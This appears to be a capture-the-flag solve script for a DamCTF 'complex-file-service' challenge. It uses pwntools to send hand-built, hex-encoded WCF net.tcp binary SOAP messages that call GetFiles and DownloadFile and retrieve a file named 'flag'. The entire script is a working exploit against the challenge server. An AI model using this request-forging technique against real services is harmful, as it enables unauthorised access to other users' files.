from pwn import *
r = remote('complex-file-service.chals.damctf.xyz', 27777)
r.send(bytes.fromhex('0001000102021f6e65742e7463703a2f2f6c6f63616c686f73743a313333372f6e657454637003080c'))
print(r.recvuntil(bytes.fromhex('0b')))
r.send(bytes.fromhex('06fc016e28687474703a2f2f74656d707572692e6f72672f4946696c65536572766963652f47657446696c65731f6e65742e7463703a2f2f6c6f63616c686f73743a313333372f6e65745463700847657446696c657313687474703a2f2f74656d707572692e6f72672f07757365725f696456020b0173040b0161065608440a1e0082ab01441aad8b66607caa8cac458d4ca821970c7099442c442aab1401400350534b0812436f6d706c657846696c655365727669636599133233383437353836323638313930313434353840034352430812436f6d706c657846696c65536572766963658dfd0a384d440c1e0082ab0301560e42050a07420981010101'))
print(r.recvuntil(bytes.fromhex('010101')))
r.send(bytes.fromhex('0692010056020b0173040b0161065608440a1e0082ab01441aad9e425139d74d96479de3d8d6b505d3cc442c442aab1401400350534b0812436f6d706c657846696c655365727669636599133233383437353836323638313930313434353840034352430812436f6d706c657846696c65536572766963658f3dd5b68c00000000440c1e0082ab0301560e42050a07420983010101'))
print(r.recvuntil(bytes.fromhex('010101')))
r.send(bytes.fromhex('06e301492c687474703a2f2f74656d707572692e6f72672f4946696c65536572766963652f446f776e6c6f616446696c650c446f776e6c6f616446696c650e66696c654964656e74696669657256020b0173040b0161065608440a1e0082ab0b441aada0cbac42ea8b4940b087405974547fb2442c442aab1401400350534b0812436f6d706c657846696c655365727669636599133233383437353836323638313930313434353840034352430812436f6d706c657846696c65536572766963658f622368fe00000000440c1e0082ab0301560e420d0a07420f9904666c6167420983010101'))
print(r.recvuntil(bytes.fromhex('010101')))
